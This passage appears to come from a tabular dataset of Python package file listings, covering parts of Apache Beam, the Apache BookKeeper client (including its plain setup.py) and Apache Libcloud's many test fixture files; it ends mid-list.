mock_ipython.py pipeline_assertion.py test_cache_manager.py __init__.py user_pipeline_tracker.py user_pipeline_tracker_test.py utils.py utils_test.py __init__.py names.py __init__.py manager.py utils.py __init__.py pipeline_context.py pipeline_context_test.py abstract_job_service.py artifact_service.py artifact_service_test.py expansion_service.py expansion_service_main.py expansion_service_test.py flink_runner.py flink_runner_test.py flink_uber_jar_job_server.py flink_uber_jar_job_server_test.py execution.py fn_runner.py fn_runner_test.py translations.py translations_test.py trigger_manager.py trigger_manager_test.py visualization_tools.py watermark_manager.py worker_handlers.py __init__.py job_server.py job_server_test.py local_job_service.py local_job_service_main.py local_job_service_test.py portable_metrics.py portable_runner.py portable_runner_test.py requirements_cache_it_test.py samza_runner_test.py sdk_container_builder.py sdk_container_builder_test.py spark_java_job_server_test.py spark_runner.py spark_runner_test.py spark_uber_jar_job_server.py spark_uber_jar_job_server_test.py stager.py stager_test.py __init__.py runner.py runner_test.py sdf_utils.py sdf_utils_test.py __init__.py bundle_processor.py bundle_processor_test.py channel_factory.py crossplatform_time.h crossplatform_unistd.h data_plane.py data_plane_test.py logger.py logger_test.py log_handler.py log_handler_test.py opcounters.pxd opcounters.py opcounters_test.py operations.pxd operations.py operation_specs.py sdk_worker.py sdk_worker_main.py sdk_worker_main_test.py sdk_worker_test.py sideinputs.py sideinputs_test.py statecache.py statecache_test.py statesampler.py statesampler_fast.pxd statesampler_fast.pyx statesampler_slow.py statesampler_test.py worker_id_interceptor.py worker_id_interceptor_test.py worker_pool_main.py worker_status.py worker_status_test.py __init__.py __init__.py preprocess.py process_tfma.py setup.py tfdv_analyze_and_validate.py model.py task.py taxi.py __init__.py __init__.py auction_bid.py field_name.py nexmark_model.py __init__.py monitor.py nexmark_launcher.py nexmark_perf.py nexmark_util.py nexmark_query_util.py query0.py query1.py query10.py query11.py query12.py query2.py query3.py query4.py query5.py query6.py query7.py query8.py query9.py winning_bids.py __init__.py __init__.py __init__.py trigger_transcripts.yaml datatype_inference.py datatype_inference_test.py extra_assertions.py extra_assertions_test.py combine_test.py co_group_by_key_test.py group_by_key_test.py load_test.py load_test_metrics_utils.py microbenchmarks_test.py pardo_test.py sideinput_test.py __init__.py metric_result_matchers.py metric_result_matchers_test.py pipeline_verifiers.py pipeline_verifiers_test.py synthetic_pipeline.py synthetic_pipeline_test.py test_pipeline.py test_pipeline_test.py test_stream.py test_stream_it_test.py test_stream_service.py test_stream_service_test.py test_stream_test.py test_utils.py test_utils_test.py util.py util_test.py __init__.py coders_microbenchmark.py distribution_counter_microbenchmark.py fn_api_runner_microbenchmark.py map_fn_microbenchmark.py microbenchmarks_test.py runtime_type_check_microbenchmark.py sideinput_microbenchmark.py teststream_microbenchmark.py utils.py __init__.py batch_dofn_test.py combinefn_lifecycle_pipeline.py combinefn_lifecycle_test.py combiners.py combiners_test.py core.py create_source.py create_test.py cy_combiners.pxd cy_combiners.py cy_dataflow_distribution_counter.pxd cy_dataflow_distribution_counter.pyx dataflow_distribution_counter_test.py deduplicate.py deduplicate_test.py display.py display_test.py dofn_lifecycle_test.py environments.py environments_test.py external.py external_it_test.py external_java.py external_test.py fully_qualified_named_transform.py fully_qualified_named_transform_test.py periodicsequence.py periodicsequence_test.py ptransform.py ptransform_test.py py_dataflow_distribution_counter.py resources.py resources_test.py sideinputs.py sideinputs_test.py sql.py sql_test.py stats.pxd stats.py stats_test.py timeutil.py transforms_keyword_only_args_test.py trigger.py trigger_test.py userstate.py userstate_test.py util.py util_test.py validate_runner_xlang_test.py window.py window_test.py write_ptransform_test.py __init__.py batch.py batch_test.py decorators.py decorators_test.py native_type_compatibility.py native_type_compatibility_test.py opcodes.py row_type.py schemas.py schemas_test.py sharded_key_type.py sharded_key_type_test.py trivial_inference.py trivial_inference_test.py typecheck.py typecheck_test.py typed_pipeline_test.py typehints.py typehints_test.py __init__.py annotations.py annotations_test.py counters.pxd counters.py counters_test.py histogram.py histogram_test.py interactive_utils.py interactive_utils_test.py plugin.py processes.py processes_test.py profiler.py profiler_test.py proto_utils.py python_callable.py python_callable_test.py retry.py retry_test.py sentinel.py sharded_key.py shared.py shared_test.py subprocess_server.py subprocess_server_test.py thread_pool_executor.py thread_pool_executor_test.py timestamp.py timestamp_test.py urns.py windowed_value.pxd windowed_value.py windowed_value_test.py __init__.py version.py __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt gen_protos.py MANIFEST.in PKG-INFO setup.cfg setup.py,,1
apache-bookkeeper-client-4.15.0,0,1,1,1,1,0,0,0,dependency_links.txt namespace_packages.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt client.py exceptions.py namespace.py namespaces.py __init__.py constants.py datetime_helpers.py exceptions.py base.py polling.py _helpers.py __init__.py general_helpers.py grpc_helpers.py method.py protobuf_helpers.py retry.py router.py __init__.py service_uri.py timeout.py util.py __init__.py client.py exceptions.py futures.py table.py __init__.py cluster_pb2.py common_pb2.py kv_pb2.py kv_rpc_pb2.py kv_rpc_pb2_grpc.py kv_store_pb2.py storage_pb2.py storage_pb2_grpc.py stream_pb2.py __init__.py types.py __init__.py PKG-INFO README.rst setup.cfg setup.py,"# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import io
import os

import setuptools

# Package metadata.

name = 'apache-bookkeeper-client'
description = 'Apache BookKeeper client library'
version = '4.15.0'
# Should be one of:
# 'Development Status :: 3 - Alpha'
# 'Development Status :: 4 - Beta'
# 'Development Status :: 5 - Production/Stable'
release_status = 'Development Status :: 3 - Alpha'
dependencies = [
    'protobuf>=3.0.0',
    'setuptools>=34.0.0',
    'six>=1.10.0',
    'pytz',
    'futures>=3.2.0;python_version<""3.2""',
    'grpcio<1.28,>=1.8.2',
    'pymmh3>=0.0.5'
]
extras = {
}

# Setup boilerplate below this line.

package_root = os.path.abspath(os.path.dirname(__file__))

readme_filename = os.path.join(package_root, 'README.rst')
with io.open(readme_filename, encoding='utf-8') as readme_file:
    readme = readme_file.read()

# Only include packages under the 'bookkeeper' namespace. Do not include tests,
# benchmarks, etc.
packages = [
    package for package in setuptools.find_packages()
    if package.startswith('bookkeeper')]

# Determine which namespaces are needed.
namespaces = ['bookkeeper']

setuptools.setup(
    name=name,
    version=version,
    description=description,
    long_description=readme,
    author='Apache BookKeeper',
    author_email='dev@bookkeeper.apache.org',
    license='Apache 2.0',
    url='https://github.com/apache/bookkeeper/tree/master/stream/clients/python',
    classifiers=[
        release_status,
        'Intended Audience :: Developers',
        'License :: OSI Approved :: Apache Software License',
        'Programming Language :: Python',
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Operating System :: OS Independent',
        'Topic :: Internet',
    ],
    platforms='Posix; MacOS X; Windows',
    packages=packages,
    namespace_packages=namespaces,
    install_requires=dependencies,
    extras_require=extras,
    include_package_data=True,
    zip_safe=False,
)
",1
apache-libcloud-3.6.0,1,1,1,1,1,0,0,0,.pylintrc dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGES.rst compute_demo.py example_aliyun_ecs.py example_aliyun_oss.py example_aliyun_slb.py example_openstack.py gce_demo.py secrets.py-dist __init__.py example_compute.py example_container.py example_dns.py example_loadbalancer.py example_storage.py base.py dimensiondata.py dummy.py ebs.py gce.py __init__.py providers.py types.py __init__.py base.py abiquo.py aliyun.py aws.py azure.py azure_arm.py base.py brightbox.py buddyns.py cloudsigma.py cloudstack.py digitalocean.py dimensiondata.py dnsimple.py dnspod.py durabledns.py exceptions.py gandi.py gandi_live.py gig_g8.py gogrid.py google.py gridscale.py hostvirtual.py kubernetes.py linode.py liquidweb.py luadns.py maxihost.py nfsn.py nsone.py nttcis.py onapp.py openstack.py openstack_identity.py osc.py ovh.py pointdns.py providers.py rackspace.py softlayer.py types.py upcloud.py vultr.py worldwidedns.py xmlrpc.py zonomi.py __init__.py base.py ec2_instance_types.py ec2_region_details_complete.py ec2_region_details_partial.py __init__.py deployment.py deprecated.py abiquo.py auroracompute.py azure.py azure_arm.py bluebox.py brightbox.py bsnl.py cloudscale.py cloudsigma.py cloudstack.py cloudwatt.py digitalocean.py dimensiondata.py dummy.py ec2.py ecp.py ecs.py elastichosts.py elasticstack.py equinixmetal.py exoscale.py gandi.py gce.py gig_g8.py gogrid.py gridscale.py gridspot.py hostvirtual.py ikoula.py indosat.py internetsolutions.py joyent.py kamatera.py kili.py ktucloud.py kubevirt.py libvirt_driver.py linode.py maxihost.py medone.py nephoscale.py ntta.py nttcis.py onapp.py oneandone.py opennebula.py openstack.py outscale.py ovh.py profitbricks.py rackspace.py rimuhosting.py scaleway.py serverlove.py skalicloud.py softlayer.py upcloud.py vcl.py vcloud.py voxel.py vpsnet.py vsphere.py vultr.py __init__.py providers.py ssh.py types.py __init__.py base.py docker.py dummy.py ecs.py gke.py joyent.py kubernetes.py lxd.py rancher.py __init__.py providers.py types.py docker.py __init__.py __init__.py pricing.json pricing.json.sha256 pricing.json.sha512 base.py auroradns.py buddyns.py cloudflare.py digitalocean.py dnsimple.py dnspod.py dummy.py durabledns.py gandi.py gandi_live.py godaddy.py google.py hostvirtual.py linode.py liquidweb.py luadns.py nfsn.py nsone.py onapp.py pointdns.py powerdns.py rackspace.py rcodezero.py route53.py softlayer.py vultr.py worldwidedns.py zerigo.py zonomi.py __init__.py providers.py types.py __init__.py http.py base.py alb.py brightbox.py cloudstack.py dimensiondata.py elb.py gce.py gogrid.py ninefold.py nttcis.py rackspace.py slb.py softlayer.py __init__.py providers.py types.py __init__.py pricing.py py.typed security.py base.py atmos.py auroraobjects.py azure_blobs.py backblaze_b2.py cloudfiles.py digitalocean_spaces.py dummy.py google_storage.py ktucloud.py local.py minio.py nimbus.py ninefold.py oss.py rgw.py s3.py scaleway.py __init__.py providers.py types.py __init__.py oec_0_9_myaccount.xml server_server.xml server_server_e75ead52_692f_4314_8725_c8a4f4d13a87.xml server_server_e75ead52_692f_4314_8725_c8a4f4d13a87_DEFAULT.xml server_server_NOBACKUP.xml _backup_client_30b1ff76_c76d_4d7c_b39d_3b72be0384c8_cancelJob.xml _backup_client_30b1ff76_c76d_4d7c_b39d_3b72be0384c8_cancelJob_FAIL.xml _backup_client_schedulePolicy.xml _backup_client_storagePolicy.xml _backup_client_SUCCESS_PUT.xml _backup_client_type.xml _backup_DISABLE.xml _backup_ENABLE.xml _backup_EXISTS.xml _backup_INFO.xml _backup_INFO_DISABLED.xml _backup_INFO_NOCLIENT.xml _backup_INFO_NOJOB.xml _backup_modify.xml _remove_backup_client.xml _remove_backup_client_FAIL.xml test_dimensiondata_v2_3.py test_dimensiondata_v2_4.py __init__.py _v1_events_12345670.json _v1_events_12345670_UNAUTHORIZED.json _v2_account.json _v2_account_UNAUTHORIZED.json _v2_actions.json _v2_actions_12345670.json _v2_actions_page_1.json _v2_actions_page_2.json pkey.json pkey.pem pkey_invalid.json pkey_invalid.pem test_aliyun.py test_aws.py test_azure.py test_base.py test_base_driver.py test_cloudstack.py test_digitalocean_v2.py test_gandi.py test_gandi_live.py test_google.py test_kubernetes.py test_nfsn.py test_openstack.py test_openstack_identity.py test_osc.py test_ovh.py test_retry_limit.py test_upcloud.py __init__.py dcs.xml ent_1.xml ent_1_dcreps.xml ent_1_dcrep_2.xml ent_1_dcrep_2_templates.xml ent_1_dcrep_2_template_11.xml login.xml not_found_error.xml privilege_errors.html unauthorized_user.html vdcs.xml vdc_4.xml vdc_4_vapps.xml vdc_4_vapp_5.xml vdc_4_vapp_5_needs_sync.xml vdc_4_vapp_5_vms.xml vdc_4_vapp_5_vm_3_not_allocated.xml vdc_4_vapp_6.xml vdc_4_vapp_6_undeploy.xml vdc_4_vapp_6_undeploy_task.xml vdc_4_vapp_6_undeploy_task_failed.xml vdc_4_vapp_6_vms.xml vdc_4_vapp_6_vms_allocated.xml vdc_4_vapp_6_vm_3.xml vdc_4_vapp_6_vm_3_allocated.xml vdc_4_vapp_6_vm_3_deploy.xml vdc_4_vapp_6_vm_3_deployed.xml vdc_4_vapp_6_vm_3_deploy_task.xml vdc_4_vapp_6_vm_3_deploy_task_failed.xml vdc_4_vapp_6_vm_3_nics.xml vdc_4_vapp_6_vm_3_reset.xml vdc_4_vapp_6_vm_3_reset_task.xml vdc_4_vapp_6_vm_3_undeploy.xml vdc_4_vapp_6_vm_3_undeploy_task.xml vdc_4_vapp_6_vm_3_undeploy_task_failed.xml vdc_4_vapp_6_vm_creation_ok.xml vdc_4_vapp_creation_ok.xml libcloud.pem _3761b98b_673d_526c_8d55_fee918758e6e_locations.xml _3761b98b_673d_526c_8d55_fee918758e6e_operations_acc33f6756cda6fd96826394fce4c9f3.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_dcoddkinztest01.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_dcoddkinztest01_deploymentslots_Production.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_dcoddkinztest01_deployments_dc03_roleinstances_dc13.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_dcoddkinztest02_deploymentslots_Production.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_dcoddkinztest03.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_dcoddkinztest03_deploymentslots_Production.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_dcoddkinztest04.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_oddkinz1_deploymentslots_Production.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_oddkinz2_deploymentslots_Production.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_oddkinz5_deploymentslots_Production.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_testdc1234.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_testdcabc.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_testdcabc2.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_testdcabc2_deployments.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_testdcabc2_deploymentslots_Production.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_testdcabc_deployments.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_images.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_storageservices_dss123.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_vmimages.xml _77777777_7777_7777_7777_777777777777_oauth2_token.json _subscriptions_99999999_providers_Microsoft_Commerce_RateCard.json _subscriptions_99999999_providers_Microsoft_Compute.json _subscriptions_99999999_providers_Microsoft_Compute_disks.json _subscriptions_99999999_providers_Microsoft_Compute_locations_eastus_vmSizes.json _subscriptions_99999999_providers_Microsoft_Compute_snapshots.json _subscriptions_99999999_providers_Microsoft_Compute_virtualMachines.json _subscriptions_99999999_providers_Microsoft_Network_networkInterfaces.json _subscriptions_99999999_providers_Microsoft_Network_virtualnetworks.json _subscriptions_99999999_resourceGroups_000000_providers_Microsoft_Compute_disks_test_disk_1.json _subscriptions_99999999_resourceGroups_000000_providers_Microsoft_Compute_snapshots_test_snap_1.json _subscriptions_99999999_resourceGroups_000000_providers_Microsoft_Compute_virtualMachines_test_node_1.json _subscriptions_99999999_resourceGroups_000000_providers_Microsoft_Compute_virtualMachines_test_node_1_InstanceView.json _subscriptions_99999999_resourceGroups_000000_providers_Microsoft_Network_networkInterfaces_test_node_1_nic.json _subscriptions_99999999_resourceGroups_111111_providers_Microsoft_Compute_disks.json _subscriptions_99999999_resourceGroups_111111_providers_Microsoft_Compute_snapshots.json _subscriptions_99999999_resourceGroups_REVIZOR_providers_Microsoft_Network_networkInterfaces_test_nic.json _subscriptions_99999999_resourceGroups_REVIZOR_providers_Microsoft_Network_publicIPAddresses_test_public_ip.json _subscriptions_99999999_resourceGroups_REVIZOR_providers_Microsoft_Network_virtualNetworks_test_network_CheckIPAddressAvailability.json _subscriptions_subid_resourceGroups_rg1_providers_Microsoft_Network_publicIPAddresses_test_ip.json api_blocks_99df878c_6e5c_4945_a635_d94da9fd3146_json.json api_blocks_99df878c_6e5c_4945_a635_d94da9fd3146_json_delete.json api_blocks_99df878c_6e5c_4945_a635_d94da9fd3146_reboot_json.json api_blocks_json.json api_blocks_json_post.json api_block_products_json.json api_block_templates_json.json create_cloud_ip.json create_server.json create_server_gb1_a.json create_server_gb1_b.json list_cloud_ips.json list_images.json list_servers.json list_server_types.json list_zones.json token.json create_node.json list_images.json list_nodes.json list_sizes.json drives_clone.txt drives_info.txt drives_single_info.txt drives_standard_info.txt resources_ip_create.txt resources_ip_list.txt servers_create.txt servers_info.txt servers_set.txt balance.json capabilities.json create_subscription.json currentusage.json drives_avail_groups.json drives_clone.json drives_create.json drives_detail.json drives_get.json drives_resize.json fwpolicies_create_no_rules.json fwpolicies_create_with_rules.json fwpolicies_detail.json keypairs_get.json keypairs_import.json keypairs_list.json libdrives.json pricing.json servers_attach_policy.json servers_avail_groups.json servers_clone.json servers_close_vnc.json servers_create.json servers_create_with_vlan.json servers_detail_all_stopped.json servers_detail_mixed_state.json servers_get.json servers_open_vnc.json start_already_started.json start_success.json stop_already_stopped.json stop_success.json subscriptions.json tags_create.json tags_create_with_resources.json tags_detail.json tags_get.json tags_update.json unknown_error.json addNicToVirtualMachine_default.json associateIpAddress_default.json attachVolume_default.json authorizeSecurityGroupIngress_default.json createAffinityGroup_default.json createEgressFirewallRule_default.json createFirewallRule_default.json createFirewallRule_firewallicmp.json createNetworkACLList_default.json createNetworkACL_default.json createNetwork_default.json createPortForwardingRule_default.json createSecurityGroup_default.json createSnapshot_default.json createSSHKeyPair_default.json createTags_default.json createTemplate_default.json createVolume_default.json createVolume_withcustomdisksize.json createVolume_withvolumetype.json createVPC_default.json createVpnConnection_default.json createVpnCustomerGateway_default.json createVpnGateway_default.json deleteAffinityGroup_default.json deleteEgressFirewallRule_default.json deleteFirewallRule_default.json deleteNetwork_default.json deletePortForwardingRule_default.json deleteSecurityGroup_default.json deleteSnapshot_default.json deleteSSHKeyPair_default.json deleteTags_default.json deleteVolume_default.json deleteVPC_default.json deleteVpnConnection_default.json deleteVpnCustomerGateway_default.json deleteVpnGateway_default.json deployVirtualMachine_default.json deployVirtualMachine_deployfail.json deployVirtualMachine_deployfail2.json deployVirtualMachine_deployip.json deployVirtualMachine_deploykeyname.json deployVirtualMachine_deploynetworks.json deployVirtualMachine_deployproject.json deployVirtualMachine_deploysecuritygroup.json deployVirtualMachine_rootdisksize.json deployVirtualMachine_stoppedvm.json destroyVirtualMachine_default.json detachVolume_default.json disassociateIpAddress_default.json dummy_rsa.pub listAffinityGroups_default.json listAffinityGroupTypes_default.json listDiskOfferings_default.json listDiskOfferings_withcustomdisksize.json listDiskOfferings_withvolumetype.json listEgressFirewallRules_default.json listFirewallRules_default.json listFirewallRules_firewallicmp.json listIpForwardingRules_default.json listNetworkACLLists_default.json listNetworkACLs_default.json listNetworkOfferings_default.json listNetworks_default.json listNetworks_deployfail.json listNetworks_deployfail2.json listNetworks_deployip.json listNetworks_deploynetworks.json listNetworks_rootdisksize.json listNetworks_stoppedvm.json listNics_default.json listOsTypes_default.json listPortForwardingRules_default.json listProjects_default.json listPublicIpAddresses_default.json listPublicIpAddresses_firewallicmp.json listResourceLimits_default.json listRouters_default.json listSecurityGroups_default.json listSecurityGroups_no_groups.json listServiceOfferings_default.json listServiceOfferings_deployip.json listServiceOfferings_deploynetworks.json listServiceOfferings_rootdisksize.json listServiceOfferings_stoppedvm.json listSnapshots_default.json listSSHKeyPairs_default.json listSSHKeyPairs_get_one.json listSSHKeyPairs_get_one_doesnt_exist.json listSSHKeyPairs_no_keys.json listTemplates_default.json listTemplates_deployip.json listTemplates_deploynetworks.json listTemplates_notemplates.json listTemplates_rootdisksize.json listTemplates_stoppedvm.json listVirtualMachines_default.json listVirtualMachines_noipaddress.json listVolumes_default.json listVolumes_rootdisksize.json listVPCOfferings_default.json listVPCs_default.json listVpnConnections_default.json listVpnCustomerGateways_default.json listVpnGateways_default.json listZones_default.json listZones_deployfail.json listZones_deployfail2.json listZones_deployip.json listZones_deploynetworks.json listZones_rootdisksize.json listZones_stoppedvm.json listZones_withcustomdisksize.json listZones_withvolumetype.json queryAsyncJobResult_11111.json queryAsyncJobResult_111112.json queryAsyncJobResult_11112.json queryAsyncJobResult_11113.json queryAsyncJobResult_11114.json queryAsyncJobResult_11115.json queryAsyncJobResult_11116.json queryAsyncJobResult_11117.json queryAsyncJobResult_1149341.json queryAsyncJobResult_1149342.json queryAsyncJobResult_1149343.json queryAsyncJobResult_1149366.json queryAsyncJobResult_1300001.json queryAsyncJobResult_1300002.json queryAsyncJobResult_1300003.json queryAsyncJobResult_1300004.json queryAsyncJobResult_1300005.json queryAsyncJobResult_1300006.json queryAsyncJobResult_17164.json queryAsyncJobResult_17165.json queryAsyncJobResult_17166.json queryAsyncJobResult_17177.json queryAsyncJobResult_17188.json queryAsyncJobResult_17199.json queryAsyncJobResult_17200.json queryAsyncJobResult_88776.json queryAsyncJobResult_88777.json queryAsyncJobResult_addnictovm.json queryAsyncJobResult_attachvolumejob.json queryAsyncJobResult_createtagsjob.json queryAsyncJobResult_createvolumejob.json queryAsyncJobResult_createVpnConnection.json queryAsyncJobResult_createVpnCustomerGateway.json queryAsyncJobResult_createVpnGateway.json queryAsyncJobResult_deleteNetwork.json queryAsyncJobResult_deletetagsjob.json queryAsyncJobResult_deleteVPC.json queryAsyncJobResult_deleteVpnConnection.json queryAsyncJobResult_deleteVpnCustomerGateway.json queryAsyncJobResult_deleteVpnGateway.json queryAsyncJobResult_deployrootdisksize.json queryAsyncJobResult_deployvmstopped.json queryAsyncJobResult_deployvmwithid.json queryAsyncJobResult_detachvolumejob.json queryAsyncJobResult_removenic.json rebootVirtualMachine_default.json registerSSHKeyPair_default.json registerSSHKeyPair_error.json removeNicFromVirtualMachine_default.json restoreVirtualMachine_default.json scaleVirtualMachine_default.json startVirtualMachine_default.json stopVirtualMachine_default.json updateVMAffinityGroup_default.json create_image.json create_key_pair.json error.json ex_power_on_node.json ex_shutdown_node.json get_image.json list_key_pairs.json list_nodes_page_1.json attach_floating_ip.json attach_volume.json create_floating_ip.json create_image.json create_key_pair.json create_node.json create_volume.json create_volume_snapshot.json detach_floating_ip.json detach_volume.json error.json error_invalid_image.json ex_change_kernel.json ex_enable_ipv6.json ex_hard_reboot.json ex_power_on_node.json ex_rebuild_node.json ex_rename_node.json ex_resize_node.json ex_shutdown_node.json get_image.json list_floating_ips.json list_images.json list_key_pairs.json list_locations.json list_node.json list_nodes.json list_nodes_empty.json list_nodes_page_1.json list_sizes.json list_volumes.json list_volumes_empty.json list_volume_snapshots.json reboot_node.json change_nic_networkadapter_response.xml deploy_customised_server.xml exchange_nic_vlans_response.xml image_customerImage.xml image_customerImage_2ffa36c8_1848_49eb_b4fa_9d908775f68c.xml image_customerImage_5234e5c7_01de_4411_8b6e_baeb8d91cf5d.xml image_osImage.xml image_osImage_6b4fb0c7_a57b_4f58_b59c_9958f94f971a.xml image_osImage_c14b1a46_2428_44c1_9c1a_b20e6418d08c.xml import_image_response.xml server_cleanServer.xml server_clone_response.xml server_GetServer.xml server_server.xml server_server_e75ead52_692f_4314_8725_c8a4f4d13a87.xml server_server_NA3.xml server_server_paginated.xml audit_log.csv detailed_usage_report.csv image_customerImage.xml image_customerImage_2ffa36c8_1848_49eb_b4fa_9d908775f68c.xml image_customerImage_5234e5c7_01de_4411_8b6e_baeb8d91cf5d.xml image_customerImage_BAD_REQUEST.xml image_osImage.xml image_osImage_6b4fb0c7_a57b_4f58_b59c_9958f94f971a.xml image_osImage_BAD_REQUEST.xml image_osImage_c14b1a46_2428_44c1_9c1a_b20e6418d08c.xml infrastructure_datacenter.xml infrastructure_datacenter_NA9.xml ip_address_lists.xml ip_address_lists_FILTERBYNAME.xml ip_address_list_create.xml ip_address_list_delete.xml ip_address_list_edit.xml network_addPublicIpBlock.xml network_createFirewallRule.xml network_createNatRule.xml network_deleteFirewallRule.xml network_deleteNatRule.xml network_deleteNetworkDomain.xml network_deleteVlan.xml network_deployNetworkDomain.xml network_deployVlan.xml network_editFirewallRule.xml network_editNetworkDomain.xml network_editVlan.xml network_expandVlan.xml network_firewallRule.xml network_firewallRule_d0a20f59_77b9_4f28_a63b_e58496b73a6c.xml network_natRule.xml network_natRule_2187a636_7ebb_49a1_a2ff_5d617f496dce.xml network_networkDomain.xml network_networkDomain_8cdfd607_f429_4df6_9352_162cfc0891be.xml network_publicIpBlock.xml network_publicIpBlock_4487241a_f0ca_11e3_9315_d4bed9b167ba.xml network_publicIpBlock_9945dc4a_bdce_11e4_8c14_b8ca3a5d9ef8.xml network_removePublicIpBlock.xml network_vlan.xml network_vlan_0e56433f_d808_4669_821d_812769517ff8.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_antiAffinityRule_create.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_antiAffinityRule_create_FAIL.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_antiAffinityRule_delete.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_antiAffinityRule_delete_FAIL.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_datacenter.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_networkWithLocation.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_network_4bba37be_506f_11e3_b29c_001517c4643e.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_11_delete.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_11_delete_INPROGRESS.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_11_poweroff.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_11_poweroff_INPROGRESS.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_11_restart.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_11_restart_INPROGRESS.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_11_shutdown.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_11_shutdown_INPROGRESS.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_11_start.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_11_start_INPROGRESS.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_deployed.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_e75ead52_692f_4314_8725_c8a4f4d13a87.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_e75ead52_692f_4314_8725_c8a4f4d13a87_disk_1.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_e75ead52_692f_4314_8725_c8a4f4d13a87_disk_1_changeSize.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_e75ead52_692f_4314_8725_c8a4f4d13a87_disk_1_changeSpeed.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_e75ead52_692f_4314_8725_c8a4f4d13a87_POST.xml oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server_pendingDeploy.xml oec_0_9_base_image.xml oec_0_9_base_imageWithDiskSpeed.xml oec_0_9_myaccount.xml port_list_create.xml port_list_delete.xml port_list_edit.xml port_list_get.xml port_list_lists.xml report_usageMonitoring.xml server_addDisk.xml server_addNic.xml server_antiAffinityRule_list.xml server_antiAffinityRule_list_PAGINATED.xml server_changeServerMonitoringPlan.xml server_cleanServer.xml server_deleteServer.xml server_deleteServer_RESOURCEBUSY.xml server_deployServer.xml server_disableServerMonitoring.xml server_enableServerMonitoring.xml server_GetServer.xml server_powerOffServer.xml server_powerOffServer_INPROGRESS.xml server_rebootServer.xml server_rebootServer_RESOURCEBUSY.xml server_reconfigureServer.xml server_removeDisk.xml server_removeNic.xml server_resetServer.xml server_server.xml server_server_e75ead52_692f_4314_8725_c8a4f4d13a87.xml server_server_NA3.xml server_server_paginated.xml server_server_paginated_empty.xml server_shutdownServer.xml server_shutdownServer_INPROGRESS.xml server_startServer.xml server_startServer_INPROGRESS.xml server_updateVmwareTools.xml summary_usage_report.csv tag_applyTags.xml tag_applyTags_BADREQUEST.xml tag_createTagKey.xml tag_createTagKey_BADREQUEST.xml tag_deleteTagKey.xml tag_deleteTagKey_BADREQUEST.xml tag_editTagKey.xml tag_editTagKey_BADREQUEST.xml tag_removeTag.xml tag_removeTag_BADREQUEST.xml tag_tagKey_5ab77f5f_5aa9_426f_8459_4eab34e03d54.xml tag_tagKey_5ab77f5f_5aa9_426f_8459_4eab34e03d54_BADREQUEST.xml tag_tagKey_list.xml tag_tagKey_list_SINGLE.xml tag_tag_list.xml _oec_0_9_8a8f6abc_2745_4d8a_9cbc_8dabe5a7d0e4_server.xml allocate_address.xml 